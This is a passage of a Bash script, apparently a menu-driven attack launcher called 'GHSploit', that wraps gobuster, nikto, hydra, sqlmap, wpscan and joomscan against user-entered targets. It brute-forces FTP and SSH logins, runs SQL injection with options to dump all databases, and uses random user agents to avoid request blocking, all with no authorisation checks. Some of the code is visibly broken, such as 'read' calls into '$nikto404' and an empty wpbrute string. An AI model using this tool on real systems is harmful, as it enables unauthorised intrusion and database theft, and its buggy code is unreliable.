	echo "At last, please, input the extentions of files you wanna brute, separated by comma"
	echo "For example : txt,zip,php,ini,cfg,sql..."
	echo "Leave empty for brute pages only"
	read -p $'\e[1;31m>>>\e[0m ' extentionsgob
}

checkgob() {
	clear
	echo "Done"
	echo "Your target url : $targeturlgob"
	echo "Your wordlist : $wordlistgob"
	echo "Threads : $threadsgob"
	echo "Extentions : $extentionsgob"
	echo "Is it all correct?(ENTER for YES&GO)"
	echo ""
	echo "1. No, URL is incorrect"
	echo "2. No, wordlist is incorrect"
	echo "3. No, I wanna change number of threads"
	echo "4. No, extentions misstyped"
	read -p $'\e[1;31m>>>\e[0m ' gobwhatswrong
	case $gobwhatswrong in
		"")
		gobustergo
		;;
		1)
		urlinputgob
		checkgob
		;;
		2)
		wlinputgob
		checkgob
		;;
		3)
		threadsgob
		checkgob
		;;
		4)
		extgob
		checkgob
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		checkgob
		;;
	esac
}

gobustergo() {
	xterm -hold -geometry 100x30 -e "gobuster dir -u $targeturlgob -w $wordlistgob -t $threadsgob --wildcard switch"
}

#===================================================================
#End of dirb & gobuster funcs
#===================================================================

#===================================================================
#START OF NIKTO FUNCS
#===================================================================
niktof() {
	niktotargetf
	niktocgif
	nikto404f
	niktocheckf
	wannabackf
}

niktotargetf() {
	clear
	banner
	echo "Enter your target URL to scan"
	echo "For example : https://targetsite.com or 192.168.0.1:80"
	read -p $'\e[1;31m>>>\e[0m ' niktotarget
}

niktocgif() {
	clear
	banner
	echo "Do you want to scan all CGI dirs?(y/n)"
	echo "If you dunno what to do, press [ENTER]"
	read -p $'\e[1;31m>>>\e[0m ' niktocgi
	case $niktocgi in
		"")
		niktocgi="-C all"
		ncgi="All"
		;;
		n)
		niktocgi=""
		ncgi="None"
		;;
		y)
		niktocgi="-C all"
		ncgi="All"
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		niktocgif
		;;
	esac
}

nikto404f() {
	clear
	banner
	echo "Which codes you want to ignore?"
	echo "For example, do you want to ignore 404(not found) code or 401(forbidden)?"
	echo "Please, submit codes to ignore, separated by comma"
	echo "Example : 404,301,401"
	read -p $'\e[1;31m>>>\e[0m ' $nikto404
}

niktocheckf() {
	clear
	banner
	echo "Almost done"
	echo "Target : $niktotarget"
	echo "CGI : $ncgi"
	echo "Codes to ignore : $nikto404"
	echo "Is it all right? [ENTER] to GO, 'n' to correct your input"
	read -p $'\e[1;31m>>>\e[0m ' niktocheck
	case $niktocheck in
		"")
		niktogo
		;;
		n)
		niktocorrectf
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		niktocheckf
		;;
	esac
}

niktocorrectf() {
	echo "Whats wrong?"
	echo "1. Target"
	echo "2. CGI"
	echo "3. Codes to ignore"
	echo "4. My bad, it is all right!"
	read -p $'\e[1;31m>>>\e[0m ' $niktocorrect
	case $niktocorrect in
		1)
		niktotargetf
		niktocheckf
		;;
		2)
		niktocgif
		niktocheckf
		;;
		3)
		nikto404f
		niktocheckf
		;;
		4)
		niktocheckf
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		niktocorrectf
		;;
	esac
}

niktogo() {
	xterm -hold -geometry 100x30 -T "Scanning target $niktotarget" -e "nikto -h $niktotarget $niktocgi $nikto404"
}

#===================================================================
#END OF NIKTO FUNCS
#===================================================================

#===================================================================
#Starting of Hydra funcs
#===================================================================
#Default port values
ftp_port=21
ssh_port=22

hydraf() {
	clear
	banner
	echo "Enter the protocol which you wanna brute"
	echo "1.FTP"
	echo "2.SSH"
	echo "3.Back to menu"
	read -p $'\e[1;31m>>>\e[0m ' hydraproc
	case $hydraproc in
		1)
		hydraftpbrute
		;;
		2)
		hydrasshbrute
		;;
		3)
		main_menu
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		hydraf
		;;
	esac
}

hydrashowattempts() {
	clear
	echo "Do you want to see attempts?"
	echo "1. Yes"
	echo "2. No"
	read -p $'\e[1;31m>>>\e[0m ' hydraattempts
	case $hydraattempts in
		1)
		hattempts="-V"
		;;
		2)
		hattempts=""
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		hydrashowattempts
		;;
	esac
}

hydraftpbrute() {
	hydraftptarget
	hydraftpport
	hydraftploginorlist
	hydraftppasswordorlist
	hydrashowattempts
	hydraftpthreads
	hydraftpcheck
	wannabackf
}

hydraftptarget() {
	clear
	banner
	echo "Insert your FTP target server you want to brute"
	read -p $'\e[1;31m>>>\e[0m ' ftptarget
}

hydraftpport() {
	clear
	banner
	echo "Is your target using default FTP port(21)?"
	echo "If yes, just press [ENTER], if not, input your custom port"
	read -p $'\e[1;31m>>>\e[0m ' ftp_port
	case $ftp_port in
		"")
		ftp_service="ftp"
		ftp_prefix=""
		ftp_port=21
		;;
		*)
		ftp_prefix="ftp://"
		ftp_service="-s $ftp_port"
		;;
	esac
}

hydraftploginorlist() {
	clear
	banner
	echo "Do you want to use a list with logins?"
	echo "Or do you have special one login to brute?"
	echo "1. I know login, I need to brute password"
	echo "2. I don't know login, but I have a list with logins"
	read -p $'\e[1;31m>>>\e[0m ' ftploginorlist
	case $ftploginorlist in
		1)
		echo "Enter your login"
		read -p $'\e[1;31m>>>\e[0m ' ftplogin
		ftplog="-l $ftplogin"
		;;
		2)
		echo "Drag'n'Drop your login list"
		read -p $'\e[1;31m>>>\e[0m ' ftp_loginlist
		ftplog="-L $ftp_loginlist"
		ftplogin=$ftp_loginlist
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		hydraftploginorlist
		;;
	esac
}

hydraftppasswordorlist() {
	clear
	banner
	echo "Do you know password?"
	echo "Or you have list with passwords?"
	echo "1. I know password"
	echo "2. I don't know password, but I have a list with passwords!"
	read -p $'\e[1;31m>>>\e[0m ' ftppassorlist
	case $ftppassorlist in
		1)
		echo "Enter the password"
		read -p $'\e[1;31m>>>\e[0m ' ftppassword
		ftppass="-p $ftppassword"
		;;
		2)
		echo "Drag'n'Drop your password list"
		read -p $'\e[1;31m>>>\e[0m ' ftppasslist
		ftppass="-P $ftppasslist"
		ftppassword=$ftppasslist
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		hydraftppasswordorlist
		;;
	esac
}

hydraftpthreads() {
	clear
	banner
	echo "Enter the number of threads you want to use"
	echo "Enter carefully, large number of threads can cause stucks, freezes and huge lags"
	echo "Optimal : 64"
	read -p $'\e[1;31m>>>\e[0m ' ftpthreads
}

hydraftpcheck() {
	clear
	banner
	echo "So, check if its all correct:"
	echo "Target : $ftptarget"
	echo "Port : $ftp_port"
	echo "Login(s) : $ftplogin"
	echo "Password(s): $ftppassword"
	echo "Threads : $ftpthreads"
	echo "Is it all right?(y/n)"
	read -p $'\e[1;31m>>>\e[0m ' ftpisitallright
	case $ftpisitallright in
		y)
		hydraftpgo
		;;
		n)
		hydraftpcorrect
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		hydraftpcheck
		;;
	esac
}

hydraftpcorrect() {
	echo "What's wrong?"
	echo "1. Target"
	echo "2. Port"
	echo "3. Login(s)"
	echo "4. Password(s)"
	echo "5. Threads"
	echo "6. My mistake, it's all right!"
	read -p $'\e[1;31m>>>\e[0m ' hydraftpcorinp
	case $hydraftpcorinp in
		1)
		hydraftptarget
		hydraftpcheck
		;;
		2)
		hydraftpport
		hydraftpcheck
		;;
		3)
		hydraftploginorlist
		hydraftpcheck
		;;
		4)
		hydraftppasswordorlist
		hydraftpcheck
		;;
		5)
		hydraftpthreads
		hydraftpcheck
		;;
		6)
		hydraftpcheck
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		hydraftpcorrect
		;;
	esac
}

hydraftpgo() {
	xterm -hold -geometry 100x30 -T "Bruteforcing FTP on $ftptarget" -e "hydra -f -I $hattempts $ftplog $ftppass $ftp_prefix$ftptarget -t $ftpthreads $ftp_service" 
}
############################################################################################3
hydrasshbrute() {
	hydrasshtarget
	hydrasshport
	hydrasshloginorlist
	hydrasshpasswordorlist
	hydrasshthreads
	hydrashowattempts
	hydrasshcheck
	wannabackf
}

hydrasshtarget() {
	clear
	banner
	echo "Insert your SSH target server you want to brute"
	read -p $'\e[1;31m>>>\e[0m ' sshtarget
}

hydrasshport() {
	clear
	banner
	echo "Is your target using default SSH port(22)?"
	echo "If yes, just press [ENTER], if not, input your custom port"
	read -p $'\e[1;31m>>>\e[0m ' ssh_port
	case $ssh_port in
		"")
		ssh_service="ssh"
		ssh_prefix=""
		ssh_port=22
		;;
		*)
		ssh_prefix="ssh://"
		ssh_service="-s $ssh_port"
		;;
	esac
}

hydrasshloginorlist() {
	clear
	banner
	echo "Do you want to use a list with logins?"
	echo "Or do you have special one login to brute?"
	echo "1. I know login, I need to brute password"
	echo "2. I don't know login, but I have a list with logins"
	read -p $'\e[1;31m>>>\e[0m ' sshloginorlist
	case $sshloginorlist in
		1)
		echo "Enter your login"
		read -p $'\e[1;31m>>>\e[0m ' sshlogin
		sshlog="-l $sshlogin"
		;;
		2)
		echo "Drag'n'Drop your login list"
		read -p $'\e[1;31m>>>\e[0m ' ssh_loginlist
		sshlog="-L $ssh_loginlist"
		sshlogin=$ssh_loginlist
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		hydrasshloginorlist
		;;
	esac
}

hydrasshpasswordorlist() {
	clear
	banner
	echo "Do you know password?"
	echo "Or you have list with passwords?"
	echo "1. I know password"
	echo "2. I don't know password, but I have a list with passwords!"
	read -p $'\e[1;31m>>>\e[0m ' sshpassorlist
	case $sshpassorlist in
		1)
		echo "Enter the password"
		read -p $'\e[1;31m>>>\e[0m ' sshpassword
		sshpass="-p $sshpassword"
		;;
		2)
		echo "Drag'n'Drop your password list"
		read -p $'\e[1;31m>>>\e[0m ' sshpasslist
		sshpass="-P $sshpasslist"
		sshpassword=$sshpasslist
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		hydrasshpasswordorlist
		;;
	esac
}

hydrasshthreads() {
	clear
	banner
	echo "Enter the number of threads you want to use"
	echo "Enter carefully, large number of threads can cause stucks, freezes and huge lags"
	echo "Optimal : 64"
	read -p $'\e[1;31m>>>\e[0m ' sshthreads
}

hydrasshcheck() {
	clear
	banner
	echo "So, check if its all correct:"
	echo "Target : $sshtarget"
	echo "Port : $ssh_port"
	echo "Login(s) : $sshlogin"
	echo "Password(s): $sshpassword"
	echo "Threads : $sshthreads"
	echo "Is it all right?(y/n)"
	read -p $'\e[1;31m>>>\e[0m ' sshisitallright
	case $sshisitallright in
		y)
		hydrasshgo
		;;
		n)
		hydrasshcorrect
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		hydrasshcheck
		;;
	esac
}

hydrasshcorrect() {
	echo "What's wrong?"
	echo "1. Target"
	echo "2. Port"
	echo "3. Login(s)"
	echo "4. Password(s)"
	echo "5. Threads"
	echo "6. My mistake, it's all right!"
	read -p $'\e[1;31m>>>\e[0m ' hydrasshcorinp
	case $hydrasshcorinp in
		1)
		hydrasshtarget
		hydrasshcheck
		;;
		2)
		hydrasshport
		hydrasshcheck
		;;
		3)
		hydrasshloginorlist
		hydrasshcheck
		;;
		4)
		hydrasshpasswordorlist
		hydrasshcheck
		;;
		5)
		hydrasshthreads
		hydrasshcheck
		;;
		6)
		hydrasshcheck
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		hydrasshcorrect
		;;
	esac
}

hydrasshgo() {
	xterm -hold -geometry 100x30 -T "Bruteforcing SSH on $sshtarget" -e "hydra -f -I $hattempts $sshlog $sshpass $ssh_prefix$sshtarget -t $sshthreads $ssh_service" 
}
#===================================================================
#SQLi funcs
#===================================================================
sqleasytest() {
	sqltargetf
	sqlbatchf
	sqlagent
	sqldumpf
	sqlcheck
}

sqlhardtest() {
	sqltargetf
	sqlbatchf
	sqlagent
	sqldataf
	sqlparamf
	sqlagressivemode
	sqldumpf
	sqlchecktwo
}

sqldumpf() {
	clear
	banner
	echo "Do you want to instantly try to dump vulnerable database(if it's exist)?"
	echo "1. Yes, I wanna to try dump the database"
	echo "2. No, I wanna do it by myself after scan"
	echo "3. Hardcore, gimme ALL DATABASES(slower)!"
	echo "4. I wanna specify name of DB to dump"
	read -p $'\e[1;31m>>>\e[0m ' dumpornot
	case $dumpornot in
		1)
		sqldump="--dump"
		dumpornot="Dump"
		;;
		2)
		sqldump=""
		dumpornot="Not dump"
		;;
		3)
		sqldump="--dump-all"
		dumpornot="Dump all"
		;;
		4)
		echo "Enter the name of your db"
		read -p $'\e[1;31m>>>\e[0m ' dbname
		sqldump="-D $dbname --dump"
		dumpornot="Dump $dbname"
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		sqldumpf
		;;
	esac
}


sqldataf() {
	clear
	banner
	echo "Which data you want to transfer to site?"
	echo "For example, username=admin&password=admin"
	echo "You can use burp-suite intercept mode to define data you transfering to site and try to play with it here"
	echo "Leave empty to not transfer data"
	read -p $'\e[1;31m>>>\e[0m ' sqldatat
	case $sqldatat in
		"")
		sqldata=""
		sqldatat="None"
		;;
		*)
		sqldata="--data='$sqldatat'"
		;;
	esac
}

sqlparamf() {
	clear
	banner
	echo "Enter the parameter you want to check or leave empty to test default parameters"
	read -p $'\e[1;31m>>>\e[0m ' sqlparameter
	case $sqlparameter in
		"")
		sqlparam=""
		;;
		*)
		sqlparam="-p $sqlparameter"
		;;
	esac
}

sqlagressivemode() {
	clear
	banner
	echo "Do you want to use agressive mode?(y/n)"
	echo "That mode will provide more tests, but may take more time"
	read -p $'\e[1;31m>>>\e[0m ' sqlagres
	case $sqlagres in
		y)
		sqlagres="--level 5"
		sqlmode="Agressive"
		;;
		n)
		sqlagres=""
		sqlmode="Soft"
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		sqlagressivemode
		;;
	esac
}

sqlagent() {
	clear
	banner
	echo "Some sites may ignore requests that come from sqlmap."
	echo "To do this, you can use the random user agent option so that sqlmap does not stop at the site's request rejection stage."
	echo "Do you want to use the random user agent? Or do you have your own, special user agent for this site?"
	echo "1. I want to use random user agent"
	echo "2. I don't want to use random user agent"
	read -p $'\e[1;31m>>>\e[0m ' sqluseragent
	case $sqluseragent in
		1)
		sqluseragent="--random-agent"
		sua="Random agent"
		;;
		2)
		sqluseragent=""
		sua="None"
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		sqlagent
		;;
	esac
}

sqltargetf() {
	clear
	banner
	echo "Well, for start, please, enter the target of SQL injection"
	read -p $'\e[1;31m>>>\e[0m ' sqltarget
}

sqlbatchf() {
	clear
	banner
	echo "Do you want to use 'batch' mode?"
	echo "In this mode, you don't have to answer the questions that sqlmap will ask you."
	echo "it will do everything by itself, a kind of automatic mode"
	echo "1. Yes, I want to run sqlmap and go make some coffee"
	echo "2. No, I want to monitor process and answer manually!"
	read -p $'\e[1;31m>>>\e[0m ' sqlbatch
	case $sqlbatch in
		1)
		sqlbatch="--batch"
		batch="True"
		;;
		2)
		sqlbatch=""
		batch="False"
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		sqlbatchf
		;;
	esac
}

sqlchecktwo() {
	clear
	banner
	echo "Your target : $sqltarget"
	echo "User agent : $sua"
	echo "Batch : $batch"
	echo "Parameter : $sqlparam"
	echo "Mode : $sqlmode"
	echo "Data : $sqldatat"
	echo "Dump : $dumpornot"
	echo "Is it all right?"
	echo "[Enter] to go, 'n' to make changes"
	read -p $'\e[1;31m>>>\e[0m ' sqlcheckans
	case $sqlcheckans in
		"")
		sqlmapgotwo
		;;
		n)
		echo "What's wrong?"
		echo "1. Target"
		echo "2. User agent"
		echo "3. Batch mode"
		echo "4. Parameter"
		echo "5. Mode"
		echo "6. Dump or not"
		echo "7. Data"
		echo "8. It's all right, GO!"
		read -p $'\e[1;31m>>>\e[0m ' sqlwrong
		case $sqlwrong in
			1)
			sqltargetf
			sqlchecktwo
			;;
			2)
			sqlagent
			sqlchecktwo
			;;
			3)
			sqlbatchf
			sqlchecktwo
			;;
			4)
			sqlparamf
			sqlchecktwo
			;;
			5)
			sqlagressivemode
			sqlchecktwo
			;;
			6)
			sqldumpf
			sqlchecktwo
			;;	
			7)
			sqldataf
			sqlchecktwo
			;;
			8)
			sqlmapgotwo
			;;
			*)
			echo "Error input, re-asking.."
			sleep 1
			sqlchecktwo
			;;
		esac
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		sqlchecktwo
		;;
	esac	
}

sqlcheck() {
	clear
	banner
	echo "Your target : $sqltarget"
	echo "User agent : $sua"
	echo "Batch : $batch"
	echo "Dump : $dumpornot"
	echo "Is it all right?"
	echo "[Enter] to go, 'n' to make changes"
	read -p $'\e[1;31m>>>\e[0m ' sqlcheckans
	case $sqlcheckans in
		"")
		sqlmapgo
		;;
		n)
		echo "What's wrong?"
		echo "1. Target"
		echo "2. User agent"
		echo "3. Batch mode"
		echo "4. Dump or not"
		echo "5. It is all right, GO!"
		read -p $'\e[1;31m>>>\e[0m ' sqlwrong
		case $sqlwrong in
			1)
			sqltargetf
			sqlcheck
			;;
			2)
			sqlagent
			sqlcheck
			;;
			3)
			sqlbatchf
			sqlcheck
			;;
			4)
			sqldumpf
			sqlcheck
			;;
			5)
			sqlmapgo
			;;
			*)
			echo "Error input, re-asking.."
			sleep 1
			sqlcheck
			;;
		esac
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		sqlcheck
		;;
	esac
}

sqlmapgotwo() {
	xterm -geometry 100x30 -hold -T "Running a SQL injection on target $sqltarget" -e "sqlmap -u '$sqltarget' $sqluseragent $sqlagres $sqlparam $sqldata $sqlbatch $sqldump"
	wannabackf
}


sqlmapgo() {
	xterm -geometry 100x30 -hold -T "Running a SQL injection on target $sqltarget" -e "sqlmap -u '$sqltarget' $sqluseragent $sqlbatch $sqldump"
	wannabackf
}

sqldumbmode() {
	xterm -hold -geometry 100x30 -T "Running sqlmap in dumb mode :)" -e "sqlmap --wizard"
	wannabackf
}

sqlf() {
	clear
	banner
	echo "Now, I need to ask you one thing"
	echo "How do you feel yourself about knowledge of sqlmap?"
	echo "If you new user, I recommend you to perform easy test"
	echo "If you experienced user and you know what parameters, data you want to test, select mode '2'"
	echo ""
	echo "1. I'm new user, wanna perfrom easy test"
	echo "2. I'm experienced user, I know what to do"
	echo "3. I'm full dumb and dunno what are you talking about, please help me :*("
	read -p $'\e[1;31m>>>\e[0m ' sqlimpques
	case $sqlimpques in
		1)
		sqleasytest
		;;
		2)
		sqlhardtest
		;;
		3)
		sqldumbmode
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		sqlf
		;;
	esac
}

#===================================================================
#Starting of wpscan funcs
#===================================================================
enumerating="-e"
detectionmode="--detection-mode aggressive"
redirect="--ignore-main-redirect"
wpusername=""
wppassword=""
wpbrute="-U $wpusername -P $wppassword"

wpscanf() {
	wpscantarget
	wpusernamef
	wpsgo
	wannabackf
}

wpusernamef() {
	clear
	banner
	echo "Do you have list of usernames to enumerate?"
	echo "1. Yes, I have list of usernames"
	echo "2. No, I won't enumerate users"
	read -p $'\e[1;31m>>>\e[0m ' wpenumusers
	case $wpenumusers in
		1)
		echo "Please, input or Drag'n'Drop list of usernames to enumerate"
		read -p $'\e[1;31m>>>\e[0m ' wpusername
		wppasswordf
		;;
		2)
		wpbrute=""
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		wpusernamef
		;;
	esac

}

wppasswordf() {
	clear
	banner
	echo "Do you have a password or password list to enumerate?"
	echo "1. Yes, I have a password/password list!"
	echo "2. No, I haven't password list"
	read -p $'\e[1;31m>>>\e[0m ' wpenumpas
	case $wpenumpas in
		1)
		echo "Please, Drag'n'Drop list of passwords to enumerate"
		read -p $'\e[1;31m>>>\e[0m ' wppassword
		;;
		2)
		echo "Sorry, you need a password or password list to enumerate"
		echo "If you haven't password, you can't brute, you should use hydra first to enumerate username and password later!"
		echo "Setting bruteforce to NONE"
		echo "Press [ENTER] to continue"
		read aoishoifioq
		wpbrute=""
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		wppasswordf
		;;
	esac
}

wpsgo() {
	xterm -hold -geometry 100x30 -T "Running WPScan" -e "wpscan --url $wptarget -e $detectionmode $redirect $wpbrute"
}

wpscantarget() {
	clear
	banner
	echo "Please, specify your target IP or hostname"
	read -p $'\e[1;31m>>>\e[0m ' wptarget
}
#===================================================================
#Ending of wpscan funcs
#===================================================================
#Starting of Joomscan funcs
#===================================================================
joomtargetf() {
	clear
	banner
	echo "Enter your target Joomla site"
	read -p $'\e[1;31m>>>\e[0m ' joomtarget
}

joomcookief() {
	clear
	banner
	echo "Do you want to set special cookie?"
	echo "1. Yes, I have one"
	echo "2. No, I haven't one"
	read -p $'\e[1;31m>>>\e[0m ' joomcookieyesno
	case $joomcookieyesno in
		1)
		echo "Please, insert your cookie string here"
		read -p $'\e[1;31m>>>\e[0m ' cookie
		joomcookie="--cookie $cookie"
		;;
		2)
		joomcookie=""
		cookie="None"
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		joomcookief
		;;
	esac
}

joomagentf() {
	clear
	banner
	echo "Do you want to use random user-agent? Or do you have special one?"
	echo "1. Yes, I have my special user-agent"
	echo "2. Yes, I want to use random user agent"
	read -p $'\e[1;31m>>>\e[0m ' joomuserag
	case $joomuserag in
		1)
		echo "Please, insert your user agent"
		read -p $'\e[1;31m>>>\e[0m ' joomuser
		juseragent="-a $joomuser"
		jshowagent="$joomuser"
		;;
		2)
		juseragent="--random-agent"
		jshowagent="Random"
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		joomagentf
		;;
	esac 
}

joomcheckf() {
	clear
	banner
	echo "Well, let's check before we go!"
	echo "Target website : $joomtarget"
	echo "User-agent : $jshowagent"
	echo "Cookie : $cookie"
	echo "Is it all right?(y/n)"
	read -p $'\e[1;31m>>>\e[0m ' joomcheck
	case $joomcheck in
		y)
		joomgo
		;;
		n)
		echo "What's wrong?"
		echo "1. Target website"
		echo "2. User agent"
		echo "3. Cookie"
		echo "4. My bad, it is all right, go now!"
		read -p $'\e[1;31m>>>\e[0m ' jwrong
		case $jwrong in
			1)
			joomtargetf
			joomcheckf
			;;
			2)
			joomagentf
			joomcheckf
			;;
			3)
			joomcookief
			joomcheckf
			;;
			4)
			joomgo
			;;
			*)
			echo "Error input, repeating..."
			sleep 1
			joomcheckf
			;;
		esac
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		joomcheckf
		;;
	esac
}

joomgo() {
	xterm -hold -geometry 100x30 -T "Attacking Joomla scan on $joomtarget" -e "joomscan -u $joomtarget -ec $juseragent $joomcookie"
	wannabackf
}

joomscanf() {
	joomtargetf
	joomcookief
	joomagentf
	joomcheckf
}


#===================================================================
#Starting 
#===================================================================
case $1 in
	-f)
	forcestart
	;;
	-h | --help)
	echo "Welcome to the GHSploit help page."
	echo "Usage tips: "
	echo "./GHSploit - standart GHSploit executing"
	echo ""
	echo "-h or --help - View this page"
	echo "-f - Force start without updating and requiements install(Not all functions may work)"
	echo "-fi - Force start with requiements installation(no system updating)"
	echo "--nonroot - Force start without root-privileges. No installing requiements, no updates"
	;;
	-fi)
	forcestartinst
	;;
	--nonroot)
	nonroot
	;;
	*)
	prestart
	main_menu
	;;
esac